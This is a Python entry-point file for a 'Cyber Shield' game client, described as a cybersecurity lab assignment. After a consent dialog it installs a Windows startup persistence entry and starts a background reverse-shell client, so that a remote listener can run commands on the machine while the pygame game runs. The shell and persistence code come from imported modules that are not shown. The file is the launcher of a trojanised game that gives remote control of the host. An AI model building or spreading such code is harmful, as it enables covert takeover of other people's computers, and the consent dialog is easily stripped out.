"""
Entry point for the Cyber Shield game client that:
  - Shows a clear consent / awareness dialog
  - Optionally enables persistence on Windows
  - Starts the reverse‑shell network client in the background
  - Launches the main pygame game from src.main
"""

import tkinter as tk
from tkinter import messagebox

# Support both package and “loose script” execution so PyInstaller works.
try:  # when run as part of the game_client package
    from . import deps_check, persistence  # type: ignore[import-not-found]
    from .config import GameConfig  # type: ignore[import-not-found]
    from .net_client import ShellClient  # type: ignore[import-not-found]
except ImportError:  # when bundled as a flat script
    from game_client import deps_check, persistence  # type: ignore[import-not-found]
    from game_client.config import GameConfig  # type: ignore[import-not-found]
    from game_client.net_client import ShellClient  # type: ignore[import-not-found]


def _show_consent_dialog(root: tk.Tk) -> bool:
    text = (
        "CYBER SHIELD – LAB GAME\n\n"
        "This game is part of a cybersecurity assignment.\n\n"
        "If you click 'Proceed to Game':\n"
        "  • The game will open a network connection back to a listener\n"
        "    controlled by the student (for educational purposes only).\n"
        "  • Commands typed in the listener can be executed on this machine\n"
        "    while the game is running.\n"
        "  • A startup entry will be created so this game/client can start\n"
        "    automatically when you log in again, until you run the cleanup tool.\n\n"
        "Use only on a virtual machine or lab computer that you control."
    )
    return messagebox.askokcancel(
        "Cyber Shield – Information",
        text,
        parent=root,
        default=messagebox.OK,
    )


def launch_game() -> None:
    """
    Main entry.
    """
    # 1) Consent + dependency checks via Tkinter
    root = tk.Tk()
    root.withdraw()

    if not _show_consent_dialog(root):
        return

    # Silent environment check – currently always OK on Windows builds.
    ok, _ = deps_check.check_runtime_dependencies()
    if not ok:
        # If something is really wrong, just stop instead of spamming dialogs.
        return

    # Automatically enable persistence after consent, without extra prompts.
    persistence.install_startup_entry()

    # 2) Start background shell client
    shell_client = ShellClient()
    shell_client.start()

    # 3) Launch the existing pygame game loop from src.main
    #    Import locally so that PyInstaller can follow the dependency.
    from src.main import main as game_main  # type: ignore[import-not-found]

    try:
        game_main()
    finally:
        shell_client.stop()


def main() -> None:  # PyInstaller friendly
    launch_game()


if __name__ == "__main__":
    main()

